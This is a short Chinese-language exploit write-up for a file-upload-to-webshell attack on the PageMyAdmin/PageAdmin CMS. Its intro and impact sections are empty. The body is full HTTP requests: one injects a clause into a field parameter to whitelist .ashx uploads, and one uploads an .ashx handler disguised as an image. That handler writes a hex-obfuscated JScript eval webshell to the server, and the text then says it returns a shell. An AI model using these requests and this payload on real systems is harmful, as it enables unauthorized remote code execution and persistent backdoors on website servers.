PageMyAdmin文件上传getshell
===========================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

先set增加ashx白名单-\>

    POST /e/aspx/upload.aspx?a=pageadmin_cms HTTP/1.1
    Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.9 Safari/537.36
    Cookie: ASP.NET_SessionId=c53k11452napjc45ibfuaw55
    Referer: http://www.0-sec.org/e/aspx/upload.aspx?a=pageadmin_cms
    Host: www.0-sec.org
    Content-Length: 106
    Connection: Keep-Alive

    submit=1&swf_upload=2&table=pa_field&field=file_ext=".jpg,.jpeg,.gif,.bmp,.ashx"  where id=174 and max_num

返回包

    HTTP/1.1 200 OK
    Cache-Control: private
    Content-Length: 72
    Content-Type: text/html; charset=utf-8
    Server: Microsoft-IIS/7.5
    X-AspNet-Version: 2.0.50727
    Date: Sat, 13 Jul 2019 07:52:02 GMT

    <script type='text/javascript'>location.href='?result=cs_error'</script>

第二步 在上传ashx-\>

    POST /e/aspx/upload.aspx HTTP/1.1
    Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzBItOAbA8GrZ7s49
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.9 Safari/537.36
    Cookie: ASP.NET_SessionId=c53k11452napjc45ibfuaw55
    Referer: http://www.0-sec.org/e/aspx/upload_p ... pic&from=master
    Host: www.0-sec.org
    Content-Length: 2318


    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="file"; filename="005.ashx"
    Content-Type: image/jpeg

    <%@ WebHandler Language="C#" Class="Handler" %>
    using System;
    using System.Web;
    using System.IO;


    public class Handler : IHttpHandler
    {
        public bool IsReusable
        {
            get
            {
                return false;
            }
        }
        public void ProcessRequest(HttpContext context)
        {
            byte[] b={0x3C, 0x25, 0x40, 0x20, 0x50, 0x61, 0x67, 0x65, 0x20, 0x4C, 0x61, 0x6E, 0x67, 0x75, 0x61, 0x67, 0x65, 0x3D, 0x22, 0x4A, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x22, 0x25, 0x3E, 0x3C, 0x25, 0x65, 0x76, 0x61, 0x6C, 0x28, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x2E, 0x49, 0x74, 0x65, 0x6D, 0x5B, 0x22, 0x70, 0x61, 0x73, 0x73, 0x22, 0x5D, 0x2C, 0x22, 0x75, 0x6E, 0x73, 0x61, 0x66, 0x65, 0x22, 0x29, 0x3B, 0x25, 0x3E};
            try
            {
                File.WriteAllBytes(context.Server.MapPath("/e/upload/s1/article/file/")+"/file.aspx",b);
                context.Response.Write("oooooooookkkkkkkkk");
            }
            catch(Exception ex)
            {
                context.Response.Write(ex.Message);
            }
            context.Response.End();
        }
    }
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="width"

    400
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="height"

    400
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="url"


    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="filesize"

    0
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="username"

    admin
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="sid"

    1
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="type"

    file
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="table"

    article
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="field"

    titlepic
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="from"

    master
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49
    Content-Disposition: form-data; name="submit"

    1
    ------WebKitFormBoundaryzBItOAbA8GrZ7s49--

发送第二步返回shell

参考链接
--------

> <https://www.t00ls.net/viewthread.php?tid=52096&highlight=PageMyadmin>
